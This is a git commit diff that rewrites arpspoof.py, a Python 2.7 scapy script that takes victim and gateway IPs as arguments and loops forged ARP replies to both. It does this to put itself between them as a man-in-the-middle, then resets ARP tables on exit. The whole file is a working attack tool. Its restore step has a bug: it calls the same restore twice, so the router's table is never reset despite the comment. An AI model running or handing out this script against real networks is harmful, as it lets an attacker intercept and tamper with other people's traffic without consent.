08c5d92ed5f4221cc430f7b7abc554d8a69e2644
Ratan Singh <79780676+PenguinBooper@users.noreply.github.com>
2022-11-18 16:28:24 +0530

    Update arpspoof.py

--- arpspoof.py
+++ arpspoof.py
@@ -1,73 +1,137 @@
-#!/usr/bin/env python
+#!/usr/bin/python2.7
+
+
 
 import scapy.all as scapy
+
 import time
+
 import sys
 
-
-def get_mac(ip):
-
-    arp_request = scapy.ARP(pdst=ip)
-
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-
-    arp_request_broadcast = broadcast / arp_request
-
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+import argparse
 
 
 
-    return answered_list[0][1].hwsrc
+def get_ip():
 
 
-def spoof(target_ip, spoof_ip):
 
-    target_mac = get_mac(target_ip)
+	parser=argparse.ArgumentParser()	
 
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+	parser.add_argument("-t","--target",dest="victim",help="Specify Victim IP addres")
 
-    scapy.send(packet, verbose=False)
+	parser.add_argument("-s","--spoof",dest="spoof",help="Specify Spoofing IP addres")
 
-
-def restore(destination_ip, source_ip):
-
-    destination_mac = get_mac(destination_ip)
-
-    source_mac = get_mac(source_ip)
-
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-
-    print(packet.show())
-
-    print(packet.summary())
+	options = parser.parse_args()
 
 
-target_ip = "//your target's IP"
 
-gateway_ip = "//your gateway"
+	if not options.victim:
+
+		parser.error("[-] Specify an IP Address for victim --help for more details")
+
+
+
+	if not options.spoof:
+
+		parser.error("[-] Specify an IP Address for spoofing --help for more details")
+
+
+
+	return options
+
+
+
+ip = get_ip()
+
+
+
+target_ip = ip.victim
+
+gateway_ip = ip.spoof
+
+
+
+def getmac(ip):
+
+	
+
+	arp_request = scapy.ARP(pdst = ip)
+
+	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+
+	arp_request_broadcast = broadcast/arp_request
+
+	answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
+
+	
+
+	return  answered_list[0][1].hwsrc
+
+
+
+def spoof(target_ip,spoof_ip):
+
+
+
+	dst_mac = getmac(target_ip)
+
+	arp_respond = scapy.ARP(op=2,pdst=target_ip,hwdst=dst_mac,psrc=spoof_ip)
+
+	#arp_respond = scapy.ARP(op="1 for request 2 for respond,pdst="victim-ip",hwdst="victim-mac",psrc="Router-ip")
+
+	scapy.send(arp_respond,verbose=False)
+
+
+
+def restore(destination_ip,source_ip):
+
+
+
+	dst_mac=getmac(destination_ip)
+
+	src_mac=getmac(source_ip)
+
+	arp_respond = scapy.ARP(op=2,pdst=destination_ip,hwdst=dst_mac,psrc=source_ip,hwsrc=src_mac)
+
+	scapy.send(arp_respond,verbose=False,count=4)
+
+
+
+count = 0
 
 try:
 
-    packets_sent_count = 0
+	while True:
 
-    while True:
+		spoof(target_ip,gateway_ip)
 
-        spoof("10.0.2.1", "10.0.2.3")
+		#telling client i am the router
 
-        spoof("10.0.2.3", "10.0.2.1")
+		spoof(gateway_ip,target_ip)
 
-        packets_sent_count = packets_sent_count + 2
+		#telling router i am the client
 
-        print("\r[+] Packets sent :" + str(packets_sent_count), end="")
+		count = count + 2
 
-        sys.stdout.flush()
+		print "\r[+] send two packets "+str(count),
 
-        time.sleep(2)
+		sys.stdout.flush()
+
+		time.sleep(2)
+
+
 
 except KeyboardInterrupt:
 
-    print("\n[-] Detected CTRL + C ....Resetting ARP tables...Please wait.\n")
 
-    restore(target_ip, gateway_ip)
 
-    restore(gateway_ip, target_ip)
+		print "\n[+] Detected CTRL+C Quitting and restoring arp value please wait"
+
+		restore(target_ip,gateway_ip)
+
+		#restoring client
+
+		restore(target_ip,gateway_ip)
+
+		#restoring router
